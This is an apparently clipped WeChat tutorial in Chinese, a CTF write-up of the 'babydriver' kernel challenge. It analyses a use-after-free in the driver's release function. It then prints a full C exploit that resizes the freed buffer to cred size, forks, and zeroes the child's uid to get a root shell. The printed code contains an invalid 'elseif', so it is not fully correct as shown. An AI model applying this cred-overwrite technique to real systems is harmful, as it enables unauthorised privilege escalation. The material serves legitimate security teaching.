---
title: 【微信】Kernel pwn基础教学之Kernel UAF
source: https://mp.weixin.qq.com/s/Fe53NHUdLK3ygc9XSyzwlg
source_host: mp.weixin.qq.com
clip_date: 2026-10-19T18:02:23+08:00
trace_id: d1f86dc4-5bc2-47ae-81d9-bd3746858b40
content_hash: 51e58a1cbe35593960df1a3fc9bfbcd0615b6c64e5f498b5db1b4cb0ff4cb922
status: synced
tags:
  - 微信
  - 内核
  - CTF
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: babydriver 的 release 未清空全局 device_buf，利用两次 open 与 ioctl 调整堆块大小，在 fork 时用 UAF 覆盖 cred 提权。
ai_summary_style: key-points
images_status:
  total: 9
  succeeded: 9
  failed_urls: []
notion_page_id: 3fe75244-d011-815b-86e1-d09ccde4e4e7
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> babydriver 的 release 未清空全局 device_buf，利用两次 open 与 ioctl 调整堆块大小，在 fork 时用 UAF 覆盖 cred 提权。
> 
> - **漏洞点：** babyrelease 中 kfree 后未将全局 babydev_struct.device_buf 置空，close 后仍可经另一 fd 读写，形成 UAF。
> - **驱动逻辑：** babyopen 用 kmem_cache_alloc_trace 分配 0x40；read/write 分别走 copy_to_user 与 copy_from_user；ioctl 命令 0x10001 先释放旧 buf 再按参数 kmalloc，可改变缓冲区大小。
> - **利用链：** 同进程 open 两次得 fd1、fd2，先 ioctl(fd1,0x10001,0xa8) 使 buf 与 cred 同大小，close(fd1) 释放后 fork，让子进程 cred 复用该块，再向 fd2 写 32 字节 0 将 uid 改为 0。
> - **环境准备：** rootfs.cpio 的 init 加载 babydriver.ko 并将 /dev/babydev 权限设为 777；exp 静态编译后放入文件系统，用 `find . | cpio -o --format=newc > rootfs.cpio` 重打包，boot.sh 启动 qemu。
> - **字符设备：** cdev 表示字符设备，class_create/device_create 在 sysfs 创建设备节点，应用层 udev 据此自动生成 /dev 节点。

**蚁景网安** *2026年10月19日 17:30*

前言

这边选择的例题是baby driver，感觉做这道题的时候有种梦回第一道栈溢出题目的感觉。但是网上很多资料讲解本题时关于字符驱动这块并没有讲解，也就造成了我一开始做这道题目的时候仅仅是照着网上的WP复现了一下并没有做到真正读懂这道题，所以这篇博客除了UAF的内容还会留出一些篇幅给字符驱动设备上。

## 1、题目分析

kernel pwn给出的附件不再是原先的Binary和libc，其附件中给出的文件如下所示

```
boot.sh     --> 启动脚本
rootfs.cpio --> 文件系统，可以从init文件中发现
bzImage     --> 压缩后的内核文件，可以使用extract_vmlinux+vmlinux_to_elf从中提取出vmlinux内核文件
```

首先我们解压rootfs.cpio，并查看init文件内容

```bash
#!/bin/sh
 
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
chown root:root flag
chmod 400 flag
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod /lib/modules/4.4.72/babydriver.ko
chmod 777 /dev/babydev
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
poweroff -d 0  -f
```

可以看到在启动脚本里有一个加载模块的命令insmod，而这个ko文件就是我们需要分析的二进制文件。使用ida打开它可以看到里面的函数并不算多，咱们一个个来看。

### babydriver_init

首先使用alloc_chrdev_region函数动态获取了一个驱动号，然后初始化了cdev结构体，在linux中通过cdev结构体来表示一个字符设备，并使用cdev_add函数添加(注册)了字符设备，执行成功后使用\_class_create函数创建相应的class，然后通过device_create函数添加设备。这里我一开始理解的时候存在一些疑问，既然在linux中是通过cdev来表示一个字符设备的，那么class存在的意义是什么？后来在查阅资料的过程中了解到linux中存在两种设备系统devfs与sysfs，而class的意义便是创建设备节点，sysfs通过class_create和device_create在设备树中创建相应的设备，应用层udev会自动根据设备树的变化生成相应的设备节点。在2.6版本以前的内核通过cdev_init和cdev_add添加字符设备以后需要手动创建设备节点，而现在则是通过使用\_class_create与device_create函数往sysfs中完成设备节点创建的任务。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8ea361b4c6fb9ff4.png)

与init对应的便是exit，这个函数的任务就是将我们刚才所创建的东西全部回收。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/626f700ee2bb7d75.png)

### babyopen

通过kmem_cache_alloc_trace函数开辟0x40的空间给babydev_struct的device_buf成员，在这里我们可以注意到babydev_struct是一个全局变量，并且其中存在buf与buf_len两个成员变量。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/3b94b2ac4df3aab5.png)

baby_read

首先会判断device_buf与device_buf_len，然后通过copy_to_usr函数将length长度的内容从device_buf读入到buffer中

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/c0ec3ccc56820b4d.png)

**babywrite**

通过copy_from_user函数将length长度的内容从buffer读入device_buf

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/71f00152422d8fc4.png)

babyioctl

当我们指定的command为0x10001时会释放掉原先的buf，然后kmalloc申请指定大小的内存空间。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/b7f4bc9e4c3a5963.png)

babyrelease

kfree释放buf但是没有置空存在UAF漏洞

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/eb187d0e5036e985.png)

三、漏洞利用

经过刚才的分析我们了解到结构体babydev_struct结构体为全局变量，并且程序在close的时候没有置空指针，造成了UAF漏洞。所以我们可以在一个进程中同时open两次babydev分别记作fd1和fd2，此时device_buf中的地址为fd2_device_buf的内存空间，而我们关闭fd1以后fd2的buf空间被释放，但是我们依然可以通过fd2进行写入。我们利用内核内存管理机制通过fork一个子进程时将cred落在fd2_device_buf上，fork出的子进程cred与父进程一致，当我们对fd2_device_buf进行写入操作也就是对子进程的cred进行操作。但是原始开辟的空间大小是0x40，所以我们在关闭fd1之前需要通过ioctl将device_buf的大小改成和cred结构体大小一样，这样在我们fork一个子进程的时候cred便会落在我们可控的内存上，将子进程的uid修改为0即可完成提权。

### EXP：

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ioctl.h>

int main(){
 int fd_1 = open("/dev/babydev", 2);
 int fd_2 = open("/dev/babydev", 2);

 ioctl(fd_1, 0x10001, 0xa8);
 close(fd_1);

 int pid = fork();

if (pid < 0) {
  puts("[-] fork error.");
exit(0);
 }
elseif (pid == 0) { 
  char zero[32] = {0};
  write(fd_2, zero, sizeof(zero));
if (getuid() == 0) {
   puts("[+] root now.");
   system("/bin/sh");
  }
 }
else {
wait(NULL);
 }

 close(fd_2);
return 0;
}
```

写好exp以后进行静态编译，将其放到原先解压好的文件系统中，然后重新打包

```
find . | cpio -o --format=newc > rootfs.cpio
```

执行boot.sh启动qemu

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/53ae67ca79c9a242.gif)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/db4c7773cd52df92.png)

学习网安实战技术，戳“阅读原文”
